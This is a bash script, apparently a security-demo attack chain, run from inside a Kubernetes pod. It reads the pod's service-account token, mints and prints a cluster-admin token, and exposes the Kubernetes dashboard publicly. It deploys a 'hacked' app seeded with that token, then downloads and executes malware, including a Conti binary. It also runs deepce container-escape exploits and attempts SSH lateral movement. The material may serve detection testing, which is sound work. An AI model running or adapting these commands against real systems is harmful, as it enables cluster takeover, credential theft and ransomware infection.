#!/bin/bash
# Instalk kubectl script
# Christopher Ley 


# install kubectl
if [ ! -f "/usr/local/bin/kubectl" ]; then
	apt update && apt -y install curl
	#Download and install kubectl into pod
	curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
	chmod +x ./kubectl
	mv ./kubectl /usr/local/bin/kubectl
fi

# execute command to take control of kubernetes cluster
# work in /tmp
cd /tmp

# Lists all Kubernetes actions the current user or service account is authorized to perform (RBAC permissions).
kubectl auth can-i --list

# create new user from reverse-shell and using kubectl with kubernetes token
kubectl config set-credentials attacker --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)

# set context with attacker user
kubectl config set-context sa-context --user=attacker

# Create new cluster-admin-sa token
kubectl create token cluster-admin-sa --namespace cloudlabs-webapp > /tmp/token

# Deploy Kubernetes Dashboard
kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.7.0/aio/deploy/recommended.yaml --token=$(cat /tmp/token)

# Access Kubernetes Dashboard
kubectl patch svc kubernetes-dashboard -n kubernetes-dashboard -p '{"spec": {"type": "LoadBalancer"}}' --token=$(cat /tmp/token)

# Deploy k8s-you-have-been-hacked app - Bad Application - namespace: hacked 
#kubectl apply -f https://raw.githubusercontent.com/cleypanw/k8s-you-have-been-hacked-app/main/deployment.yaml --token=$(cat /tmp/token)

# Downloadkubernetes-hacked-app hacked app deployment - Bad Application - namespace: hacked 
curl -O https://raw.githubusercontent.com/cleypanw/k8s-webapp-hacked/main/k8s/deployment.yaml
#kubectl apply -f https://raw.githubusercontent.com/cleypanw/k8s-webapp-hacked/main/k8s/deployment.yaml --token=$(cat /tmp/token)

# Sleep 15 secondes to get K8s Dashboard App URL
echo "wait 15 seconds for URLs"
sleep 15

# Set Env
kubectl get svc kubernetes-dashboard -n kubernetes-dashboard -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' --token=$(cat /tmp/token) > /tmp/k8surl
k8surl=`cat /tmp/k8surl`; sed -i "s/CHANGE_K8SURL/https\:\/\/${k8surl}/g" /tmp/deployment.yaml
k8stoken=`cat /tmp/token`; sed -i "s/CHANGE_K8STOKEN/${k8stoken}/g" /tmp/deployment.yaml

# Deploy app 
kubectl apply -f /tmp/deployment.yaml --token=$(cat /tmp/token)

# Sleep 15 secondes to get Hacked App URL
echo "wait 15 seconds for URLs"
sleep 15

# PAWNED URL
echo "Go to the Hacked Application URL to get info to connect to the cluster"
kubectl get svc hacked-svc -n hacked -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' --token=$(cat /tmp/token) > /tmp/hackedurl
hackedurl=`cat /tmp/hackedurl`
echo "Hacked Application URL is:  http://${hackedurl}:8080"
kubectl get svc hacked-svc -n hacked --token=$(cat /tmp/token) 

# Kubernetes Dashboard URL
echo "Kubernetes Dashboard URL is: https://${k8surl}"
kubectl get svc kubernetes-dashboard -n kubernetes-dashboard --token=$(cat /tmp/token) 

# Echo ClusterAdmin Token (remove ey to print output on GitHub action)
echo "Cluster Admin Token is: "
cat /tmp/token 

# Download sample malware
echo "Downloading elf malware"
wget wildfire.paloaltonetworks.com/publicapi/test/elf
chmod +x elf
./elf

# Download conti malware
echo "Downloading Conti-C2 malware"
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O conti.sh
chmod +x conti.sh
./conti.sh

# container enumeration
echo "Downloading container enumeration and exploits"
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O deepce.sh
chmod +x deepce.sh
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
./deepce.sh --no-enumeration --exploit SOCK --shadow
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepcechmod +x deepce.sh

# Lateral Movement 
echo "Attempting SSH to target machine..."
ssh user@target-machine || echo "[!] SSH to target failed - Continuing..."
